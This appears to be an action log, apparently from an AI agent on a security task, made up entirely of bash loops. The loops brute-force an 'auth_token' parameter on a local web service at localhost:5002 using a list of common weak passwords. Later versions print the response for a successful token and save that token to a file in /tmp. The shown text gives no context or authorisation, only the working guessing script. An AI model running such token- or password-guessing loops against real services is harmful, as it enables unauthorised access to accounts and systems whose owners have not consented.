action: for token in admin123 letmein password1 qwerty 12345678 trustno1; do echo -n "$token: "; curl -s -o /dev/null -w "%{http_code}\n" "http://localhost:5002/?auth_token=$token"; done
for token in admin123 letmein password1 qwerty 12345678 trustno1; do echo -n "$token: "; curl -s -o /dev/null -w "%{http_code}\n" "http://localhost:5002/?auth_token=$token"; done

for token in admin123 letmein password1 qwerty 12345678 trustno1; do
status=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:5002/?auth_token=$token")
if [ "$status" -eq 200 ]; then echo "Success token: $token"; break; fi
done

for token in admin123 letmein password1 qwerty 12345678 trustno1; do
status=$(curl -s -w "%{http_code}" -o /tmp/resp.txt "http://localhost:5002/?auth_token=$token")
if [ "$status" -eq 200 ]; then
echo "Success token: $token"
cat /tmp/resp.txt
break
fi
done

for token in admin123 letmein password1 qwerty 12345678 trustno1; do
status=$(curl -s -w "%{http_code}" -o /tmp/resp.txt "http://localhost:5002/?auth_token=$token")
if [ "$status" -eq 200 ]; then
echo "$token" > /tmp/success_token.txt
cat /tmp/resp.txt
break
fi
done
